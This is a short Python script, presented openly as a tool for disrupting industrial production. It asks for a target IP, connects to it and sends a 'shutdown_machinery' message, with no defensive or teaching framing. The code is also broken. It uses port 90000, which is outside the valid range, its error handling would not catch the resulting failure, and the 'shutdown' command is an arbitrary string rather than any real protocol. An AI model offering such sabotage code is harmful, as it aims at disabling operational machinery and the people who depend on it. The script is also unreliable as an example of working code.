import socket
import sys

def disrupt_production(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 90000))
        s.send(b"shutdown_machinery")
        print(f"Disrupted production at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    disrupt_production(target)

if __name__ == "__main__":
    main()
